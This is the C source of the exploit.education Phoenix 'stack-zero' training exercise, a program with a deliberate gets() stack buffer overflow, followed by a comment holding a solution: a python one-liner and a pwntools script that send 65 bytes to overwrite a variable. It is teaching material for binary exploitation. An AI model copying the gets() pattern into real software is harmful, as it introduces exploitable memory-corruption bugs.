/*
 * phoenix/stack-zero, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable.
 *
 * Scientists have recently discovered a previously unknown species of
 * kangaroos, approximately in the middle of Western Australia. These
 * kangaroos are remarkable, as their insanely powerful hind legs give them
 * the ability to jump higher than a one story house (which is approximately
 * 15 feet, or 4.5 metres), simply because houses can't can't jump.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER "Welcome to Binary exploit, brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv)
{
  struct
  {
    char buffer[64]; // buffer is lower in memory that changeme. If we overwrite it(upwards), it will overflow into changeme
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer); //vulnerability 

  if (locals.changeme != 0)
  {
    puts("Well done, the 'changeme' variable has been changed!");
  }
  else
  {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}

/***** Exploit ******
 * we need to write 64 + 1 bytes to overflow into changeme variable
 
 * python3 -c 'print("A"*65)' | ./stack-zero 
 
from pwn import *

payload = b"A"*65

target = process("./stack-zero")

print(target.recv())

target.writeline(payload) # adds '\n' which will trigger enter in stdin

print(target.recv())

 */